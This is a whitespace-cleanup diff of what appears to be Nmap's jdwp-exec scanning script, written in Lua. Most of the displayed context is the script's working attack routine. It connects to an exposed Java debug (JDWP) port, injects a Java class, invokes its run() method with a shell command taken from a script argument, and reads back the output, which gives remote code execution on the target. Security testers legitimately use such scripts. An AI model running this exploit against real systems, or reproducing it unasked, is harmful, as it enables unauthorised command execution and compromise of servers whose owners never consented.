@@ -13,8 +13,8 @@ remote code execution.  This script abuses this to inject and execute
 a Java class file that executes the supplied shell command and returns
 its output.
 
-The script injects the JDWPSystemInfo class from 
-nselib/jdwp-class/ and executes its run() method which 
+The script injects the JDWPSystemInfo class from
+nselib/jdwp-class/ and executes its run() method which
 accepts a shell command as its argument.
 
 ]]
@@ -24,7 +24,7 @@ accepts a shell command as its argument.
 --
 -- @args jdwp-exec.cmd 	Command to execute on the remote system.
 --
--- @output 
+-- @output
 -- PORT     STATE SERVICE REASON
 -- 2010/tcp open  search  syn-ack
 -- | jdwp-exec:
@@ -52,10 +52,10 @@ action = function(host, port)
 		return nil
 	end
 
-	-- read .class file 
+	-- read .class file
 	local file = io.open(nmap.fetchfile("nselib/data/jdwp-class/JDWPExecCmd.class"), "rb")
 	local class_bytes = file:read("*all")
-	
+
 	-- inject the class
 	local injectedClass
 	status,injectedClass = jdwp.injectClass(socket,class_bytes)
@@ -65,14 +65,14 @@ action = function(host, port)
 	end
 	-- find injected class method
 	local runMethodID = jdwp.findMethod(socket,injectedClass.id,"run",false)
-	
+
 	if runMethodID == nil then
 		stdnse.print_debug(1, "%s: Couldn't find run method", SCRIPT_NAME)
 		return stdnse.format_output(false, "Couldn't find run method.")
-	end	
-	-- set run() method argument 
+	end
+	-- set run() method argument
 	local cmd = stdnse.get_script_args(SCRIPT_NAME .. '.cmd')
-	if cmd == nil then 
+	if cmd == nil then
 		return stdnse.format_output(false, "This script requires a cmd argument to be specified.")
 	end
 	local cmdID
@@ -83,15 +83,15 @@ action = function(host, port)
 	end
 	local runArgs = bin.pack(">CL",0x4c,cmdID)	-- 0x4c is object type tag
 	-- invoke run method
-	local result 	
-	status, result = jdwp.invokeObjectMethod(socket,0,injectedClass.instance,injectedClass.thread,injectedClass.id,runMethodID,1,runArgs) 
+	local result
+	status, result = jdwp.invokeObjectMethod(socket,0,injectedClass.instance,injectedClass.thread,injectedClass.id,runMethodID,1,runArgs)
 	if not status then
 		stdnse.print_debug(1, "%s: Couldn't invoke run method", SCRIPT_NAME)
 		return stdnse.format_output(false, result)
 	end
 	-- get the result string
 	local _,_,stringID = bin.unpack(">CL",result)
-	status,result = jdwp.readString(socket,0,stringID)	
-	return stdnse.format_output(status,result)	
+	status,result = jdwp.readString(socket,0,stringID)
+	return stdnse.format_output(status,result)
 end
 
